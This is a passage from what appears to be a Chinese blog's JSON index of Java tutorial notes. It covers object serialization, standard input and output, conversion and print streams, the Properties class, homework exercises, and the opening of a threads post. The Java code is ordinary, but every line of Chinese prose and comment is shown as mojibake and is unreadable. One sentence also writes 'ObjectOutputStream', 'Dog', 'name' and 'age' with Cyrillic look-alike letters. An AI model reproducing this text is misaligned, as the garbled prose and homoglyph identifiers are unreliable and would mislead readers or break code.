6)åºåˆ—åŒ–å…·å¤‡å¯ç»§æ‰¿æ€§ï¼Œä¹Ÿå°±æ˜¯å¦‚æœæŸç±»å·²ç»å®ç°äº†åºåˆ—åŒ–ï¼Œåˆ™å®ƒçš„æ‰€æœ‰å­ç±»ä¹Ÿå·²ç»é»˜è®¤å®ç°äº†åºåˆ—åŒ–\n\n### ObjectOutputStream\n\n- ObjectOutputStream æä¾›åºåˆ—åŒ–åŠŸèƒ½\n\n- åºåˆ—åŒ–å¯¹è±¡ï¼Œéœ€è¦å®ç°Serializable\n\nä¾‹å­ğŸŒ°ï¼šä½¿ç”¨ ĞbjĞµÑtĞutÑ€utĞ…trĞµĞ°m åºåˆ—åŒ–åŸºæœ¬æ•°æ®ç±»å‹å’Œä¸€ä¸ª DĞ¾g å¯¹è±¡(nĞ°mĞµ, Ğ°gĞµ), å¹¶ä¿å­˜åˆ° data.dat æ–‡ä»¶ä¸­\n\n```java\npackage com.jwt.outputstream_;\n\nimport java.io.FileOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.io.Serializable;\n\npublic class ObjectOutStream_ {\n    public static void main(String[] args) throws Exception {\n        //åºåˆ—åŒ–åï¼Œä¿å­˜çš„æ–‡ä»¶æ ¼å¼ï¼Œä¸æ˜¯å­˜æ–‡æœ¬ï¼Œè€Œæ˜¯æŒ‰ç…§ä»–çš„æ ¼å¼æ¥ä¿å­˜\n        String filePath = \"/Users/jianjian/Downloads/b.dat\";\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filePath));\n        //åºåˆ—åŒ–æ•°æ®åˆ°filePath\n        oos.writeInt(100);// int -> Integer (å®ç°äº†Serializable)\n        oos.writeBoolean(true);// boolean -> Boolean (å®ç°äº†Serializable)\n        oos.writeChar('a');// char -> Character (å®ç°äº†Serializable)\n        oos.writeDouble(9.5);// double -> Double (å®ç°äº†Serializable)\n        oos.writeUTF(\"ä¸€å®šè¦å¼€å¿ƒå•Š\");//String\n        //ä¿å­˜ä¸€ä¸ªdog å¯¹è±¡\n        oos.writeObject(new Dog(\"æ—ºè´¢\", 10));\n        oos.close();\n        System.out.println(\"æ•°æ®ä¿å­˜å®Œæ¯•(åºåˆ—åŒ–å½¢å¼)\");\n    }\nstatic class Dog implements Serializable {\n    String name;\n    int age;\n    public Dog(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n}\n}\n```\n\n###  ObjectInputStream\n\n- ObjectInputStream æä¾›ååºåˆ—åŒ–åŠŸèƒ½\n- ååºåˆ—åŒ–å¯¹è±¡ï¼Œéœ€è¦å®ç°Serializable\n\nä¾‹å­ğŸŒ°ï¼šä½¿ç”¨ ObjectInputStream è¯»å– data.dat å¹¶ååºåˆ—åŒ–æ¢å¤æ•°æ®\n\n```java\npackage com.jwt.inputstream_;\n\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.ObjectInputStream;\n\npublic class ObjectInputStream_ {\n    public static void main(String[] args) throws IOException, ClassNotFoundException {\n        // 1.åˆ›å»ºæµå¯¹è±¡\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"/Users/jianjian/Downloads/b.dat\"));\n        // 2.è¯»å–ï¼Œ æ³¨æ„é¡ºåº\n        System.out.println(ois.readInt());\n        System.out.println(ois.readBoolean());\n        System.out.println(ois.readChar());\n        System.out.println(ois.readDouble());\n        System.out.println(ois.readUTF());\n        System.out.println(ois.readObject());\n        // 3.å…³é—­\n        ois.close();\n        System.out.println(\"ä»¥ååºåˆ—åŒ–çš„æ–¹å¼è¯»å–(æ¢å¤)ok~\");\n    }\n}\n```\n\n## æ ‡å‡†è¾“å…¥è¾“å‡ºæµ\n\n| åç§°                  | ç±»å‹         | é»˜è®¤è®¾å¤‡ |\n| --------------------- | ------------ | -------- |\n| System.in æ ‡å‡†è¾“å…¥æµ  | InputStream  | é”®ç›˜     |\n| System.out æ ‡å‡†è¾“å‡ºæµ | OutputStream | æ˜¾ç¤ºå™¨   |\n\n```java\npackage com.jwt.standard;\n\nimport java.util.Scanner;\n\npublic class InputOutput {\n    public static void main(String[] args) {\n        //1.æºç ï¼špublic final static Inputstream in = null;\n        //2.System.in ç¼–è¯‘ç±»å‹ Inputstream\n        //3.System.in è¿è¡Œç±»å‹ BufferedInputstream\n        //4.è¡¨ç¤ºçš„æ˜¯æ ‡å‡†è¾“å…¥ é”®ç›˜\n        System.out.println(System.in.getClass());\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"è¾“å…¥ï¼š\");\n        System.out.println(\"è¾“å‡ºï¼š\" + scanner.next());\n\n        //1.æºç ï¼špublic final static PrintStream out = null;\n        //2.ç¼–è¯‘ç±»å‹ Printstream\n        //3.è¿è¡Œç±»å‹ Printstream\n        //4.è¡¨ç¤ºæ ‡å‡†è¾“å‡º æ˜¾ç¤ºå™¨\n        System.out.println(System.out.getClass());\n        System.out.println(\"helloï¼Œä½ å¥½ï½\");\n    }\n}\n```\n\n## è½¬æ¢æµ\n\n- InputStreamReader:Readerçš„å­ç±»ï¼Œå¯ä»¥å°†InputStream(å­—èŠ‚æµ)åŒ…è£…æˆ(è½¬æ¢)Reader(å­—ç¬¦æµ), å®ƒè¯»å–å­—èŠ‚ï¼Œå¹¶ä½¿ç”¨æŒ‡å®šçš„å­—ç¬¦é›†å°†å…¶è§£ç ä¸ºå­—ç¬¦ã€‚\n- OutputStreamWriter:Writerçš„å­ç±»ï¼Œå®ç°å°†OutputStream(å­—èŠ‚æµ)åŒ…è£…æˆWriter(å­—ç¬¦æµ)\n- å½“å¤„ç†çº¯æ–‡æœ¬æ•°æ®æ—¶ï¼Œå¦‚æœä½¿ç”¨å­—ç¬¦æµæ•ˆç‡æ›´é«˜ï¼Œå¹¶ä¸”å¯ä»¥æœ‰æ•ˆè§£å†³ä¸­æ–‡é—®é¢˜ï¼Œæ‰€ä»¥å»ºè®®å°†å­—èŠ‚æµè½¬æ¢æˆå­—ç¬¦æµ\n- å¯ä»¥åœ¨ä½¿ç”¨æ—¶æŒ‡å®šç¼–ç æ ¼å¼(æ¯”å¦‚utf- 8, gbkï¼Œgb2312, IS08859-1ç­‰)\n\n### InputStreamReader\n\nä¾‹å­ğŸŒ°ï¼šç¼–ç¨‹å°†å­—èŠ‚æµ FileInputStream åŒ…è£…æˆ(è½¬æ¢æˆ)å­—ç¬¦æµ InputStreamReaderï¼Œå¯¹æ–‡ä»¶è¿›è¡Œè¯»å–(æŒ‰ç…§utf-8/gbkæ ¼å¼)ï¼Œè¿›è€Œåœ¨åŒ…è£…æˆBufferedReader\n\n```java\npackage com.jwt.transformation;\n\nimport java.io.*;\n\npublic class InputStreamReader_ {\n    public static void main(String[] args) throws IOException {\n        String filePath = \"/Users/jianjian/Downloads/a.txt\";\n        //1. æŠŠFileInputStream è½¬æˆInputStreamReader,æŒ‡å®šç¼–ç gbk\n        InputStreamReader isr = new InputStreamReader(new FileInputStream(filePath),\"gbk\");\n        //2. æŠŠInputStreamReader ä¼ å…¥BufferedReader\n        BufferedReader br = new BufferedReader(isr);\n        //å°†1å’Œ2åˆåœ¨ä¸€èµ·\n        //BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(filePath), \"gbk\"));\n        //3. è¯»å–\n        String s = br.readLine();\n        System.out.println(\"è¯»å–å†…å®¹=\" + s);\n        //4. å…³é—­å¤–å±‚æµ\n        br.close();\n    }\n}\n```\n\n### OutputStreamWriter\n\nä¾‹å­ğŸŒ°ï¼šç¼–ç¨‹å°†å­—èŠ‚æµ FileOutputStream åŒ…è£…æˆ(è½¬æ¢æˆ)å­—ç¬¦æµ OutputStreamWriterï¼Œå¯¹æ–‡ä»¶è¿›è¡Œå†™å…¥(æŒ‰ç…§gbkæ ¼å¼ï¼Œå¯ä»¥æŒ‡å®šå…¶ä»–ï¼Œæ¯”å¦‚utf-8)\n\n```java\npackage com.jwt.transformation;\n\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.OutputStreamWriter;\n\npublic class OutputStreamWriter_ {\n    public static void main(String[] args) throws IOException {\n        // 1.åˆ›å»ºæµå¯¹è±¡\n        OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(\"/Users/jianjian/Downloads/a.txt\"), \"gbk\");\n        // 2.å†™å…¥\n        osw.write(\"hello,ä½ å¥½å‘€~\");\n        // 3.å…³é—­\n        osw.close();\n        System.out.println(\"ä¿å­˜æˆåŠŸ~\");\n    }\n}\n```\n\n## æ‰“å°æµ\n\næ‰“å°æµåªæœ‰è¾“å‡ºæµï¼Œæ²¡æœ‰è¾“å…¥æµ\n\n### PrintStream\n\n```java\npackage com.jwt.transformation;\n\nimport org.junit.Test;\n\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.io.PrintStream;\n\npublic class PrintStream_ {\n    @Test\n    //æ ‡å‡†è¾“å‡ºåˆ°å±å¹•\n    public void write01() throws IOException {\n        PrintStream printStream = new PrintStream(System.out);\n        printStream.print(\"hello,ä½ å¥½\");\n        //printStream.write(\"hello,ä½ å¥½\".getBytes());\n        printStream.close();\n    }\n    @Test\n    //ä¿®è¯¥æ‰“å°æµè¾“å‡ºä½ç½®\n    public void write02() throws FileNotFoundException {\n        System.setOut(new PrintStream(\"/Users/jianjian/Downloads/a.txt\"));\n        System.out.println(\"ä½ å¥½å‘€\");\n    }\n}\n\n```\n\n### PrintWriter\n\n```java\npackage com.jwt.transformation;\n\nimport org.junit.Test;\n\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\npublic class PrintWriter_ {\n    @Test\n    //æ ‡å‡†è¾“å‡ºåˆ°å±å¹•\n    public void write01(){\n        PrintWriter printWriter = new PrintWriter(System.out);\n        printWriter.print(\"hello,ä½ å¥½\");\n        printWriter.close();\n    }\n\n    @Test\n    //è¾“å‡ºåˆ°æ–‡ä»¶\n    public void write02() throws IOException {\n        PrintWriter printWriter = new PrintWriter(new FileWriter(\"/Users/jianjian/Downloads/a.txt\"));\n        printWriter.print(\"hello,ä½ å¥½\");\n        printWriter.close();\n    }\n}\n```\n\n## Propertiesç±»\n\n### é—®é¢˜å¼•å‡º\n\nå¦‚ä¸‹ä¸€ä¸ªé…ç½®æ–‡ä»¶ mysql.properties\n\n```properties\nuser=root\npassword=12345\n```\n\nè¯·é—®ç¼–ç¨‹è¯»å– user å’Œ password çš„å€¼æ˜¯å¤šå°‘ï¼Ÿ\n\n#### ä¼ ç»Ÿæ–¹æ³•\n\n```java\npackage com.jwt.io.properties_;\nimport org.junit.Test;\nimport java.io.*;\nimport java.util.Properties;\n\npublic class Properties01 {\n    //ä¼ ç»Ÿçš„æ–¹æ³•\n    @Test\n    public void traditionRead() throws IOException {\n        BufferedReader bufferedReader = new BufferedReader(new FileReader(\"src//mysql.properties\"));\n        String line = \"\";\n        while ((line = bufferedReader.readLine()) != null){\n            String[] split = line.split(\"=\");\n            //å¦‚æœæˆ‘ä»¬è¦æ±‚æŒ‡å®šçš„å€¼\n            if(\"user\".equals(split[0])) {\n                System.out.println(\"ç”¨æˆ·å=\" + split[1]);\n            }\n            if(\"password\".equals(split[0])) {\n                System.out.println(\"å¯†ç =\" + split[1]);\n            }\n        }\n        bufferedReader.close();\n    }\n}\n```\n\n#### ä½¿ç”¨Propertiesç±»\n\n```java\npackage com.jwt.io.properties_;\nimport org.junit.Test;\nimport java.io.*;\nimport java.util.Properties;\n\npublic class Properties01 {\n    @Test\n    public void propertiesRead() throws IOException {\n        //1. åˆ›å»ºProperties å¯¹è±¡\n        Properties properties = new Properties();\n        //2. åŠ è½½æŒ‡å®šé…ç½®æ–‡ä»¶\n        properties.load(new FileReader(\"src//mysql.properties\"));\n        //3. æŠŠk-væ˜¾ç¤ºæ§åˆ¶å°\n        properties.list(System.out);\n        //4. æ ¹æ®keyè·å–å¯¹åº”çš„å€¼\n        String user = properties.getProperty(\"user\");\n        String pwd = properties.getProperty(\"password\");\n        System.out.println(\"ç”¨æˆ·å=\" + user);\n        System.out.println(\"å¯†ç æ˜¯=\" + pwd);\n    }\n}\n\n```\n\n### Properties ä»‹ç»\n\nProperties æ˜¯ä¸“é—¨ç”¨äºè¯»å†™é…ç½®æ–‡ä»¶çš„é›†åˆç±»\n\n- é…ç½®æ–‡ä»¶çš„æ ¼å¼:\n\n```\né”®=å€¼\né”®=å€¼\n```\n\n- æ³¨æ„:é”®å€¼å¯¹ä¸éœ€è¦æœ‰ç©ºæ ¼ï¼Œå€¼ä¸éœ€è¦ç”¨å¼•å·å¼•èµ·æ¥ï¼Œé»˜è®¤ç±»å‹æ˜¯String\n\n**Propertiesçš„å¸¸è§æ–¹æ³•**\n\n- load()ï¼šåŠ è½½é…ç½®æ–‡ä»¶çš„é”®å€¼å¯¹åˆ°Propertieså¯¹è±¡\n- list()ï¼šå°†æ•°æ®æ˜¾ç¤ºåˆ°æŒ‡å®šè®¾å¤‡\n- getProperty(key)ï¼šæ ¹æ®é”®è·å–å€¼\n- setProperty(key,value)ï¼šè®¾ç½®é”®å€¼å¯¹åˆ°Propertieså¯¹è±¡\n- store(arg0,arg1)ï¼šå°†Propertiesä¸­çš„é”®å€¼å¯¹å­˜å‚¨åˆ°é…ç½®æ–‡ä»¶ï¼Œåœ¨ideaä¸­ï¼Œä¿å­˜ä¿¡æ¯åˆ°é…ç½®æ–‡ä»¶ï¼Œå¦‚æœå«æœ‰ä¸­æ–‡ï¼Œä¼šå­˜å‚¨ä¸ºunicodeç \n  - ç¬¬ä¸€ä¸ªå‚æ•°ä¸º OutputStream/Writer ç”¨æ¥æŒ‡å‘åŠ è½½çš„é…ç½®æ–‡ä»¶\n  -  ç¬¬äºŒä¸ªå‚æ•°ä¸º String ç”¨æ¥ç»™é…ç½®æ–‡ä»¶æ·»åŠ æ³¨é‡Šã€‚\n- http://tool.chinaz.com/tools/unicode.aspx unicodeç æŸ¥è¯¢å·¥å…·\n\nä¾‹å­ğŸŒ°ï¼šä½¿ç”¨ Properties ç±»æ·»åŠ  key-val åˆ°æ–°æ–‡ä»¶ mysql2.properties ä¸­ï¼Œå†ä½¿ç”¨ Properties ç±»å®Œæˆå¯¹ mysql2.properties çš„è¯»å–ï¼Œå¹¶ä¿®æ”¹æŸä¸ª key-val\n\nè¦ç‚¹ï¼šä½¿ç”¨Properties ç±»æ¥åˆ›å»ºé…ç½®æ–‡ä»¶, ä¿®æ”¹é…ç½®æ–‡ä»¶å†…å®¹\n\n- 1.å¦‚æœè¯¥æ–‡ä»¶æ²¡æœ‰keyå°±æ˜¯åˆ›å»º\n\n- 2.å¦‚æœè¯¥æ–‡ä»¶æœ‰keyå°±æ˜¯ä¿®æ”¹\n\n```java\npackage com.jwt.io.properties_;\n\nimport org.junit.Test;\n\nimport java.io.*;\nimport java.util.Properties;\n\npublic class Properties01 {\n    @Test\n    public void insertProperties() throws IOException {\n        Properties properties = new Properties();\n        //æ·»åŠ \n        properties.setProperty(\"test\",\"123\");\n        properties.setProperty(\"user\", \"æ±¤å§†\");//ä¿å­˜æ—¶ï¼Œæ˜¯ä¸­æ–‡çš„unicode ç å€¼\n        properties.store(new FileWriter(\"src//mysql.properties2\"), null);\n//        properties.store(new FileOutputStream(\"src//mysql.properties2\"),null);\n        System.out.println(\"ä¿å­˜é…ç½®æ–‡ä»¶æˆåŠŸ~\");\n        //è¯»å–\n        Properties properties2 = new Properties();\n        properties2.load(new FileReader(\"src//mysql.properties2\"));\n        properties2.list(System.out);\n        //ä¿®æ”¹\n        properties2.setProperty(\"test\",\"456\");\n        properties2.store(new FileWriter(\"src//mysql.properties2\"),\"æµ‹è¯•ä¸€ä¸‹ä¸‹\");\n        System.out.println(\"ä¿®æ”¹æˆåŠŸ~\");\n    }\n}\n```\n\n## IOç»ƒä¹ \n\n### 1.ç¼–ç¨‹é¢˜Homework01.java\n\n- (1)åœ¨åˆ¤æ–­æ˜¯å¦æœ‰æ–‡ä»¶å¤¹mytemp ,å¦‚æœæ²¡æœ‰å°±åˆ›å»ºmytemp\n- (2)åœ¨mytempç›®å½•ä¸‹ï¼Œåˆ›å»ºæ–‡ä»¶hello.txt\n- (3)å¦‚æœhello.txtå·²ç»å­˜åœ¨ï¼Œæç¤ºè¯¥æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œå°±ä¸è¦å†é‡å¤åˆ›å»ºäº†\n- (4)å¹¶ä¸”åœ¨hello.txtæ–‡ä»¶ä¸­ï¼Œå†™å…¥hello,world~\n\n```java\npackage com.jwt.io.homework;\nimport java.io.*;\n\npublic class Homework01\n{\n    public static void main(String[] args) throws IOException {\n        String directory = \"/Users/jianjian/Downloads/mytemp\";\n        File file = new File(directory);\n        if (!file.exists()) {\n            file.mkdirs();\n            System.out.println(\"ç›®å½•åˆ›å»ºæˆåŠŸ\");\n        } else {\n            System.out.println(\"ç›®å½•å·²å­˜åœ¨\");\n        }\n        String filePath = directory + \"/hello.txt\";\n        File file2 = new File(filePath);\n        if (!file2.exists()){\n            file2.createNewFile();\n            System.out.println(\"æ–‡ä»¶åˆ›å»ºæˆåŠŸ\");\n            FileWriter fileWriter = new FileWriter(filePath);\n            fileWriter.write(\"hello,world~\");\n            System.out.println(\"æ–‡æœ¬å†™å…¥æˆåŠŸ\");\n            fileWriter.close();\n        } else{\n            System.out.println(\"æ–‡ä»¶å·²å­˜åœ¨\");\n        }\n    }\n}\n```\n\n### 2.ç¼–ç¨‹é¢˜Homework02.java\n\nè¦æ±‚ï¼šä½¿ç”¨ BufferedReader è¯»å–ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œä¸ºæ¯è¡ŒåŠ ä¸Šè¡Œå·ï¼Œå†è¿åŒå†…å®¹ä¸€å¹¶è¾“å‡ºåˆ°å±å¹•ä¸Šã€‚\n\n- å¦‚æœæŠŠæ–‡ä»¶çš„ç¼–ç æ”¹æˆäº†gbk ,å‡ºç°ä¸­æ–‡ä¹±ç ï¼Œå¦‚ä½•è§£å†³ï¼Ÿ\n- 1.é»˜è®¤æ˜¯æŒ‰ç…§utf-8å¤„ç†ï¼Œå¼€å§‹æ²¡æœ‰ä¹±ç \n- 2.æç¤º:ä½¿ç”¨è½¬æ¢æµï¼Œå°†FilelnputStream -> InputStreamReader[æŒ‡å®šç¼–ç ] -> BufferedReader \n\n```java\npackage com.jwt.io.homework;\n\nimport java.io.*;\n\npublic class Homework02 {\n    public static void main(String[] args){\n        String filePath = \"/Users/jianjian/Downloads/hello.txt\";\n        BufferedReader bufferedReader = null;\n        String line = \"\";\n        int linenum = 0;\n        try {\n\n            bufferedReader = new BufferedReader(new FileReader(filePath));\n            while ((line = bufferedReader.readLine()) != null) {\n                System.out.println(++linenum + line);\n            }\n\n            //1. æŠŠFileInputStreamè½¬æˆInputStreamReader,æŒ‡å®šç¼–ç gbk\n            InputStreamReader isr = new InputStreamReader(new FileInputStream(filePath),\"gbk\");\n            //2. æŠŠInputStreamReader ä¼ å…¥BufferedReader\n            BufferedReader br = new BufferedReader(isr);\n            while ((line = br.readLine()) != null) {\n                System.out.println(++linenum + line);\n            }\n            \n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (bufferedReader != null) {\n                try {\n                    bufferedReader.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n}\n```\n\n### 3.ç¼–ç¨‹é¢˜Homework03.java\n\n- (1)ç¼–å†™ä¸€ä¸ª dog.properties\n\n```properties\nname=tom\nage=5\ncolor=red\n```\n\n- (2)ç¼–å†™ Dog ç±» (name,age,color) åˆ›å»ºä¸€ä¸ª dog å¯¹è±¡ï¼Œè¯»å– dog.properties ç”¨ç›¸åº”çš„å†…å®¹å®Œæˆå±æ€§åˆå§‹åŒ–ï¼Œå¹¶è¾“å‡º\n- (3)å°†åˆ›å»ºçš„Dogå¯¹è±¡,åºåˆ—åŒ–åˆ°æ–‡ä»¶dog.datæ–‡ä»¶\n- (4)å†è¯»å– dog.dat å¹¶ååºåˆ—åŒ–æ¢å¤æ•°æ®\n\n```java\npackage com.jwt.io.homework;\n\nimport java.io.*;\nimport java.util.Properties;\n\npublic class Homework03 {\n    public static void main(String[] args) throws IOException, ClassNotFoundException {\n        Properties properties = new Properties();\n        properties.load(new FileReader(\"src//dog.properties\"));\n        String name = properties.getProperty(\"name\");\n        int age = Integer.parseInt(properties.getProperty(\"age\"));\n        String color = properties.getProperty(\"color\");\n        Dog dog = new Dog(name, age, color);\n        System.out.println(dog);\n        \n        //å°†åˆ›å»ºçš„Dogå¯¹è±¡,åºåˆ—åŒ–åˆ°æ–‡ä»¶dog.datæ–‡ä»¶\n        String filePath = \"/Users/jianjian/Downloads/dog.dat\";\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filePath));\n        oos.writeObject(dog);\n        oos.close();\n        System.out.println(\"æ•°æ®ä¿å­˜å®Œæ¯•(åºåˆ—åŒ–å½¢å¼)\");\n\n        // ååºåˆ—åŒ–dog\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filePath));\n        System.out.println(ois.readObject());\n        ois.close();\n\n    }\n}\nclass Dog implements Serializable {\n    private String name;\n    private int age;\n    private String color;\n\n    public Dog(String name, int age, String color) {\n        this.name = name;\n        this.age = age;\n        this.color = color;\n    }\n\n    @Override\n    public String toString() {\n        return \"Dog{\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                \", color='\" + color + '\\'' +\n                '}';\n    }\n}\n```\n\n## â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["IOæµ"],"categories":["JavaSE"]},{"title":"Java-çº¿ç¨‹","url":"/posts/18034.html","content":"\n## å‰è¨€\n\nå“ˆå–½ï¼å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å°ç®€ã€‚ä»Šå¤©å¼€å§‹å­¦ä¹ ã€ŠJava-çº¿ç¨‹ã€‹ï¼Œæ­¤ç³»åˆ—æ˜¯æˆ‘åšçš„ä¸€ä¸ª â€œJava ä» 0 åˆ° 1 â€ å®éªŒï¼Œç»™è‡ªå·±ä¸€å¹´å·¦å³æ—¶é—´ï¼ŒæŒ‰ç…§æˆ‘è‡ªå·±æ€»ç»“çš„ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html)ï¼Œä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ï¼Œå¹¶ä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šé¢„è®¡3å¤©æ›´æ–°å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š02-22\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š02-24\n- [x] ğŸ€æ€»ç»“ï¼šæŒ‰æ—¶å®Œæˆä»»åŠ¡ï¼Œç»§ç»­ä¸‹ä¸€ä¸ª ğŸš©\n\n## ç›¸å…³æ¦‚å¿µ\n\n**ç¨‹åº**\n\nç¨‹åºæ˜¯ä¸ºå®Œæˆç‰¹å®šä»»åŠ¡ã€ç”¨æŸç§è¯­è¨€ç¼–å†™çš„ä¸€-ç»„æŒ‡ä»¤çš„é›†åˆã€‚ç®€å•çš„è¯´:å°±æ˜¯æˆ‘ä»¬å†™çš„ä»£ç \n\n**è¿›ç¨‹**\n\nè¿›ç¨‹æ˜¯æŒ‡è¿è¡Œä¸­çš„ç¨‹åºï¼Œå¯åŠ¨ä¸€ä¸ªè¿›ç¨‹ï¼Œæ“ä½œç³»ç»Ÿå°±ä¼šä¸ºè¯¥è¿›ç¨‹åˆ†é…å†…å­˜ç©ºé—´ã€‚\n\nè¿›ç¨‹æ˜¯ç¨‹åºçš„ä¸€æ¬¡æ‰§è¡Œè¿‡ç¨‹ï¼Œæˆ–æ˜¯æ­£åœ¨è¿è¡Œçš„ä¸€ä¸ªç¨‹åºã€‚æ˜¯åŠ¨æ€è¿‡ç¨‹:æœ‰å®ƒè‡ªèº«çš„äº§ç”Ÿã€å­˜åœ¨å’Œæ¶ˆäº¡çš„è¿‡ç¨‹ã€‚\n\n**çº¿ç¨‹**\n\nçº¿ç¨‹ç”±è¿›ç¨‹åˆ›å»ºçš„ï¼Œæ˜¯è¿›ç¨‹çš„ä¸€ä¸ªå®ä½“ï¼Œä¸€ä¸ªè¿›ç¨‹å¯ä»¥æ‹¥æœ‰å¤šä¸ªçº¿ç¨‹\n\n- 1.å•çº¿ç¨‹ï¼šåŒä¸€ä¸ªæ—¶åˆ»ï¼Œåªå…è®¸æ‰§è¡Œä¸€ä¸ªçº¿ç¨‹\n- 2.å¤šçº¿ç¨‹ï¼šåŒä¸€ä¸ªæ—¶åˆ»ï¼Œå¯ä»¥æ‰§è¡Œå¤šä¸ªçº¿ç¨‹ï¼Œæ¯”å¦‚ï¼šä¸€ä¸ª QQ è¿›ç¨‹ï¼Œå¯ä»¥åŒæ—¶æ‰“å¼€å¤šä¸ªèŠå¤©çª—å£ï¼Œä¸€ä¸ªè¿…é›·è¿›ç¨‹ï¼Œå¯ä»¥åŒæ—¶ä¸‹è½½å¤šä¸ªæ–‡ä»¶\n\n**å¹¶å‘**\n\nåŒä¸€ä¸ªæ—¶åˆ»ï¼Œå¤šä¸ªä»»åŠ¡äº¤æ›¿æ‰§è¡Œï¼Œé€ æˆä¸€ç§\"è²Œä¼¼åŒæ—¶â€çš„é”™è§‰ï¼Œç®€å•çš„è¯´ï¼Œ\nå•æ ¸ cpu å®ç°çš„å¤šä»»åŠ¡å°±æ˜¯å¹¶å‘ã€‚ä¾‹å¦‚ï¼šTom è¾¹å¼€è½¦è¾¹æ¥ç”µè¯\n\n**å¹¶è¡Œ**\n\nåŒä¸€ä¸ªæ—¶åˆ»ï¼Œå¤šä¸ªä»»åŠ¡åŒæ—¶æ‰§è¡Œã€‚å¤šæ ¸ cpu å¯ä»¥å®ç°å¹¶è¡Œã€‚ä¾‹å¦‚ï¼šTom å¼€è½¦ ï¼ŒJack æ¥ç”µè¯\n\n## çº¿ç¨‹åŸºæœ¬ä½¿ç”¨\n\n### åˆ›å»ºçº¿ç¨‹çš„ä¸¤ç§æ–¹å¼\n\n- 1.ç»§æ‰¿ Thread ç±»,é‡å†™ run æ–¹æ³•\n- 2.å®ç° Runnable æ¥å£ï¼Œé‡å†™ run æ–¹æ³•\n\n**è¯´æ˜**\n\n- 1.java æ˜¯å•ç»§æ‰¿çš„ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ä¸€ä¸ªç±»å¯èƒ½å·²ç»ç»§æ‰¿äº†æŸä¸ªçˆ¶ç±»ï¼Œè¿™æ—¶åœ¨ç”¨ç»§æ‰¿ Thread ç±»æ–¹æ³•æ¥åˆ›å»ºçº¿ç¨‹æ˜¾ç„¶ä¸å¯èƒ½äº†ã€‚\n- 2.java è®¾è®¡è€…ä»¬æä¾›äº†å¦å¤–ä¸€ä¸ªæ–¹å¼åˆ›å»ºçº¿ç¨‹ï¼Œ å°±æ˜¯é€šè¿‡å®ç° Runnable æ¥å£æ¥åˆ›å»ºçº¿ç¨‹\n\n### ä¾‹å­ğŸŒ°ï¼šç»§æ‰¿ Thread ç±»åˆ›å»ºçº¿ç¨‹\n\n- è¯·ç¼–å†™ç¨‹åºï¼Œå¼€å¯ä¸€ä¸ªçº¿ç¨‹ï¼Œè¯¥çº¿ç¨‹æ¯éš”1ç§’ï¼Œåœ¨æ§åˆ¶å°è¾“å‡º\"å–µå–µ, æˆ‘æ˜¯å°çŒ«å’ªâ€ï¼Œå½“è¾“å‡º10æ¬¡åï¼Œç»“æŸè¯¥çº¿ç¨‹ã€‚\n\n```java\npackage com.jwt.threaduse;\n\npublic class Thread01 {\n    public static void main(String[] args) {\n        Cat cat = new Cat();\n        cat.start();//start è°ƒç”¨äº† start0(),start0() è°ƒç”¨äº† run()\n    }\n}\nclass Cat extends Thread{\n    private int count = 0;\n    @Override\n    public void run() {\n        while (true) {\n            System.out.println(\"å–µå–µ, æˆ‘æ˜¯å°çŒ«å’ª\" + (++count) + \" çº¿ç¨‹å=\" + Thread.currentThread().getName());\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            if (count == 10){\n                break;\n            }\n        }\n        System.out.println(\"çº¿ç¨‹ç»“æŸã€‚ã€‚ã€‚\");\n    }\n}\n```\n\n### 